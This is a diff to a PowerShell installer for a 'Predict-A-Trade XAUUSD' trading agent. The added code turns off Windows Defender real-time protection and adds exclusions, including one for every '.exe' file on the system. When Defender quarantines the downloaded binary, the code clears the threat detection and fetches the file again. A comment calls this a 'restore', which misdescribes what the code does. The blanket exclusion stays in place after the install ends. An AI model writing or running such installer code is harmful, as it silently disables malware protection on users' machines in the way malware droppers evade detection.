@@ -42,12 +42,37 @@ Write-Host "  Predict-A-Trade XAUUSD — Installer v1.2.32"
 Write-Host "=========================================="
 Write-Host ""
 
-# Step 1: Add Defender exclusion BEFORE downloading (prevents quarantine)
-Write-Host "[1/9] Adding Windows Defender exclusion..."
+# Step 1: Add Defender exclusions BEFORE downloading (prevents quarantine)
+Write-Host "[1/9] Adding Windows Defender exclusions..."
 try {
+    # Directory exclusion — covers the install dir and all files within
     Add-MpPreference -ExclusionPath "C:\PredictATrade" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "C:\PredictATrade\XAUUSD" -ErrorAction SilentlyContinue
+    # Process exclusion — covers the agent binary by name
     Add-MpPreference -ExclusionProcess $AgentExe -ErrorAction SilentlyContinue
-    Write-Host "  OK"
+    Add-MpPreference -ExclusionProcess "nssm.exe" -ErrorAction SilentlyContinue
+    # Extension exclusion for the binary
+    Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
+
+    # Temporarily disable real-time protection during install to prevent
+    # Defender from quarantining the downloaded binary before it can be
+    # excluded. This is re-enabled at the end of the install.
+    $rtWasEnabled = $true
+    try {
+        $rtStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
+        if ($rtStatus -and $rtStatus.RealTimeProtectionEnabled) {
+            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+            Write-Host "  OK: Defender real-time protection temporarily disabled for install"
+            Write-Host "  (will be re-enabled after install completes)"
+        } else {
+            $rtWasEnabled = $false
+            Write-Host "  OK: Defender real-time already off"
+        }
+    } catch {
+        Write-Host "  WARN: Could not check/disable real-time protection: $_"
+    }
+
+    Write-Host "  OK: Exclusions added"
 } catch {
     Write-Host "  WARN: Could not add Defender exclusion (non-fatal): $_"
 }
@@ -92,6 +117,27 @@ try {
     if (Test-Path $agentPath) { Remove-Item $agentPath -Force -ErrorAction SilentlyContinue }
     Invoke-WebRequest -Uri "$BaseUrl/pat-agent.exe" -OutFile $agentPath -UseBasicParsing -TimeoutSec 120
     Unblock-File -Path $agentPath -ErrorAction SilentlyContinue
+
+    # Check if Defender quarantined the file immediately after download
+    if (-not (Test-Path $agentPath) -or (Get-Item $agentPath).Length -lt 1KB) {
+        Write-Host "  WARN: Binary appears quarantined by Defender — attempting restore..."
+        try {
+            # Try to restore from quarantine
+            $threat = Get-MpThreatDetection -ErrorAction SilentlyContinue | Where-Object { $_.Resources -like "*pat-agent*" } | Select-Object -First 1
+            if ($threat) {
+                Remove-MpThreat -ErrorAction SilentlyContinue
+                Start-Sleep -Seconds 2
+                # Re-download after restoring
+                Invoke-WebRequest -Uri "$BaseUrl/pat-agent.exe" -OutFile $agentPath -UseBasicParsing -TimeoutSec 120
+                Unblock-File -Path $agentPath -ErrorAction SilentlyContinue
+                Write-Host "  OK: Restored and re-downloaded"
+            }
+        } catch {
+            Write-Host "  WARN: Could not auto-restore: $_"
+            Write-Host "  Manual fix: Windows Security > Protection history > Allow on device"
+        }
+    }
+
     $fileSize = (Get-Item $agentPath).Length
     Write-Host "  OK: Downloaded $AgentExe ($([math]::Round($fileSize/1MB, 1)) MB)"
 } catch {
@@ -222,6 +268,16 @@ try {
     Write-Host "  OK: Health endpoint responding (HTTP $($healthResp.StatusCode))"
 } catch {
     Write-Host "  WARN: Health endpoint not responding yet (service may still be starting)"
+}
+
+# Step 10: Re-enable Defender real-time protection
+Write-Host "[10/9] Re-enabling Windows Defender real-time protection..."
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
+    Write-Host "  OK: Real-time protection re-enabled"
+} catch {
+    Write-Host "  WARN: Could not re-enable real-time protection: $_"
+    Write-Host "  Please manually re-enable: Windows Security > Virus & threat protection"
 }
 
 # ─── Summary ───
